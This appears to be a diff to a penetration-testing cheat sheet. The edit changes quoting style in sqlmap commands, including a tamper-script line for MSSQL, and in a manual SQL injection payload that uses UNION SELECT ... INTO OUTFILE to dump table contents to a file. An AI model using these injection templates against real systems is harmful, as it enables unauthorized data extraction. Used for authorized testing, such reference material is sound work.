@@ -75,7 +75,7 @@ sqlmap -u <url>
 
 ## sqlmap - classic post
 ```
-sqlmap -u <url> -d "<params>"
+sqlmap -u <url> -d '<params>'
 ```
 
 ## sqlmap - get with cookie
@@ -113,7 +113,7 @@ sqlmap -u <url> --dbms=MSSQL tamper=between,bluecoat,charencode,charunicodeencod
 
 ## SQLI Manually - Dump the content of table into the filesystem
 ```
-')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
+')) union select <column1>,<column2> from <table name> into outfile '<url to file>' --+
 ```
 
 ## SQLI Manually - find the number of columns
